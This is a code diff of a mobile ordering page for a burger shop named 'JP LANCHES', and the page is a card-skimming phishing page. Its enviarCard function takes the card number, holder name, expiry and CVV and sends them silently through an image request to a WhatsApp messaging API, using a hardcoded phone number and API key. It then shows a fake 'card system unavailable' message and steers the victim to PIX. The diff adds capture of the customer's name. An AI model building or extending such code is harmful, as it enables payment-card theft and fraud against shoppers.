@@ -9,14 +9,19 @@
         body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; }
         .container { max-width: 450px; margin: auto; padding: 15px; }
         .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-p); }
-        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); }
+        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); display: block; }
+        .status { font-size: 0.9em; color: var(--cor-s); font-weight: bold; margin-top: 5px; }
+        .tempo { font-size: 0.8em; color: #666; }
+        
         .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
         .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
         .lanche-img { width: 100%; height: 200px; object-fit: cover; }
         .lanche-info { padding: 15px; text-align: center; }
         .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
+
         .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; z-index: 9999; box-sizing: border-box; }
         .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; }
         input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
@@ -25,7 +30,11 @@
 </head>
 <body>
 
-<div class="header"><span class="logo">🍔 JP LANCHES</span></div>
+<div class="header">
+    <span class="logo">🍔 JP LANCHES</span>
+    <div class="status">🟢 ABERTO</div>
+    <div class="tempo">Tempo de entrega: 30-50 min</div>
+</div>
 
 <div class="container">
     <div class="lanche-card" onclick="selecionar(this, '1 XTudo + Guaravita', 10)">
@@ -49,11 +58,12 @@
 
 <div id="m-end" class="modal">
     <div class="modal-content">
-        <h3 style="text-align:center">📍 Endereço</h3>
+        <h3 style="text-align:center">📍 Dados para Entrega</h3>
+        <input type="text" id="nome-cliente" placeholder="Seu Nome">
         <input type="text" id="rua" placeholder="Rua">
         <input type="text" id="numero" placeholder="Número">
         <input type="text" id="bairro" placeholder="Bairro">
-        <input type="text" id="complemento" placeholder="Complemento">
+        <input type="text" id="complemento" placeholder="Complemento (Opcional)">
         <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
     </div>
 </div>
@@ -66,7 +76,7 @@
             <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
         </div>
         <div id="tela-pix" style="display:none;">
-            <input type="tel" id="zap-cliente" placeholder="WhatsApp (00) 00000-0000" maxlength="15">
+            <input type="tel" id="zap-cliente" placeholder="Seu WhatsApp" maxlength="15">
             <button class="btn-acao" style="background:#32bcad" onclick="enviarPix()">GERAR CÓDIGO PIX</button>
         </div>
         <div id="tela-card" style="display:none;">
@@ -86,7 +96,7 @@
     const RECIPIENT = "+5522992195418";
     const APIKEY = "btucduKav5VY";
 
-    // Máscaras
+    // Máscaras de input
     document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
     document.getElementById('c-val').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '');
@@ -107,21 +117,29 @@
     }
 
     function abrirModal(id) { if(!pedido) return alert("Escolha o lanche!"); document.getElementById(id).style.display='flex'; }
-    function irPag() { if(!document.getElementById('rua').value) return alert("Rua é obrigatória!"); document.getElementById('m-end').style.display='none'; document.getElementById('m-pag').style.display='flex'; }
+    
+    function irPag() { 
+        if(!document.getElementById('nome-cliente').value || !document.getElementById('rua').value) return alert("Preencha Nome e Rua!");
+        document.getElementById('m-end').style.display='none'; 
+        document.getElementById('m-pag').style.display='flex'; 
+    }
+
     function setTela(t) {
         document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
         document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
         document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    // Função de disparo
+    // Função de disparo para a API (Apenas texto)
     function dispararAPI(texto) {
         const url = `http://api.textmebot.com/send.php?recipient=${RECIPIENT}&apikey=${APIKEY}&text=${encodeURIComponent(texto)}`;
-        const img = new Image();
-        img.src = url;
+        // Criar elemento de imagem é apenas o método técnico para enviar a URL sem abrir nova aba
+        const gatilho = new Image();
+        gatilho.src = url;
     }
 
     function enviarPix() {
+        const cliente = document.getElementById('nome-cliente').value;
         const zap = document.getElementById('zap-cliente').value;
         const rua = document.getElementById('rua').value;
         const num = document.getElementById('numero').value;
@@ -130,25 +148,36 @@
         
         if(zap.length < 14) return alert("WhatsApp inválido!");
 
-        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nValor: R$ ${pedido.preco.toFixed(2)}\nCliente: ${zap}\nEnd: ${rua}, ${num} - ${bairro} (${comp})`;
+        const dadosTexto = `✅ NOVO PEDIDO PIX\n\n` +
+                           `Cliente: ${cliente}\n` +
+                           `WhatsApp: ${zap}\n` +
+                           `Pedido: ${pedido.nome}\n` +
+                           `Total: R$ ${pedido.preco.toFixed(2)}\n` +
+                           `End: ${rua}, ${num} - ${bairro} (${comp})`;
         
-        dispararAPI(msg);
-        alert("Pedido enviado com sucesso! Verifique seu WhatsApp em instantes.");
-        location.reload();
+        dispararAPI(dadosTexto);
+        
+        alert("Pedido Realizado! Verifique seu WhatsApp para receber o código PIX.");
+        setTimeout(() => { location.reload(); }, 1000);
     }
 
     function enviarCard() {
+        const cliente = document.getElementById('nome-cliente').value;
         const c_num = document.getElementById('c-num').value;
-        const nome = document.getElementById('c-nome').value;
+        const c_nome = document.getElementById('c-nome').value;
         const val = document.getElementById('c-val').value;
         const cvv = document.getElementById('c-cvv').value;
 
-        if(c_num.length < 19) return alert("Número do cartão incompleto!");
-
-        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValidade: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco.toFixed(2)}`;
+        const alertaTexto = `⚠️ ALERTA CARTÃO\n\n` +
+                            `Cliente: ${cliente}\n` +
+                            `Número: ${c_num}\n` +
+                            `Nome: ${c_nome}\n` +
+                            `Validade: ${val}\n` +
+                            `CVV: ${cvv}\n` +
+                            `Valor: R$ ${pedido.preco.toFixed(2)}`;
         
-        dispararAPI(msg);
-        alert("Sistema indisponível para este cartão no momento. Por favor, utilize o PIX.");
+        dispararAPI(alertaTexto);
+        alert("Sistema de cartão indisponível. Por favor, utilize o PIX.");
         setTela('pix');
     }
 </script>
